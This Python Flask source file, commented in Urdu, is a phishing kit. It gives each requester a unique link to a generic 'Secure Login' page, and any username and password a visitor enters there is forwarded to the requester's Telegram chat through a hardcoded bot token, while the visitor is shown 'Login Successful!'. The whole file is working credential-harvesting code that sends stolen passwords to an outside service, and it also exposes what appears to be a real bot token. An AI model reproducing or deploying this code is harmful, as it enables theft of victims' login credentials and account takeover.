import requests
import random
import string
from flask import Flask, request, render_template_string

app = Flask(__name__)

# 🔹 Telegram Bot Details
TELEGRAM_BOT_TOKEN = "7184974136:AAFkcNjXwOKVJmSgqPnXvd4Fo9DwC4UPFWs"
USER_SESSIONS = {}  # ہر یوزر کے لیے لاگ اِن لنک اور Telegram ID اسٹور کریں گے

# 🔹 HTML Login Page
login_page = """
<!DOCTYPE html>
<html>
<head><title>Secure Login</title></head>
<body>
    <h2>Login Page</h2>
    <form method="POST">
        Username: <input type="text" name="username" required><br>
        Password: <input type="password" name="password" required><br>
        <button type="submit">Login</button>
    </form>
</body>
</html>
"""

def generate_unique_link():
    """یونیک لاگ اِن لنک بنانے کے لیے ایک فنکشن"""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=10))

@app.route("/get_login_link/<int:telegram_chat_id>")
def get_login_link(telegram_chat_id):
    """جب کوئی یوزر بوٹ سے لاگ اِن لنک مانگے، تو اسے یونیک لنک دیں"""
    unique_id = generate_unique_link()
    login_url = f"http://your-server.com/login/{unique_id}"  # اپنے سرور کا URL دو

    # 🔹 یوزر کے لیے لاگ اِن لنک اسٹور کریں
    USER_SESSIONS[unique_id] = telegram_chat_id

    # 🔹 Telegram پر یوزر کو لاگ اِن لنک بھیجیں
    message = f"🚀 Your unique login link: {login_url}\n⚠️ Use this link only once!"
    telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    requests.post(telegram_url, data={"chat_id": telegram_chat_id, "text": message})

    return f"Login link sent to Telegram: {login_url}"

@app.route("/login/<unique_id>", methods=["GET", "POST"])
def login(unique_id):
    """یوزر کے لاگ اِن پیج کو ہینڈل کرے گا"""
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")

        # 🔹 دیکھو کہ یہ لاگ اِن کس یوزر کے لیے بنایا گیا تھا
        telegram_chat_id = USER_SESSIONS.get(unique_id)
        if not telegram_chat_id:
            return "<h2>Invalid or Expired Link</h2>"

        # 🔹 Telegram پر لاگ اِن ڈیٹا بھیجیں (صرف اسی یوزر کو جس نے لنک بنایا تھا)
        message = f"🔐 New Login Attempt:\n👤 Username: {username}\n🔑 Password: {password}"
        telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        requests.post(telegram_url, data={"chat_id": telegram_chat_id, "text": message})

        return "<h2>Login Successful! Data sent to your Telegram.</h2>"

    return render_template_string(login_page)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
